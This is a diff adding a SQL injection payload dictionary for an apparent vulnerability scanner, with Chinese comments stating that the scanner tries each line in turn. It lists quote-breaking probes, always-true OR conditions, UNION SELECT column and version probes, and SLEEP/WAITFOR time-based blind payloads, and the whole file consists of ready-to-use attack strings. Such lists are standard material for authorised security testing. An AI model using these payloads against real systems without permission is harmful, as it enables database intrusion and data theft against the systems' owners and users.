@@ -1,0 +1,41 @@
+# SQL Injection Payload Dictionary
+# 每行一个payload，扫描器将逐个尝试
+# 格式: payload
+
+# === 闭合引号型（基于错误回显） ===
+'
+"
+`
+')
+")
+`)
+''
+""
+
+# === 永真条件型（布尔盲注） ===
+' OR 1=1--
+' OR '1'='1
+' OR 1=1#
+' OR '1'='1'#
+" OR 1=1--
+" OR "1"="1
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+
+# === UNION注入型 ===
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+
+# === 时间盲注型 ===
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
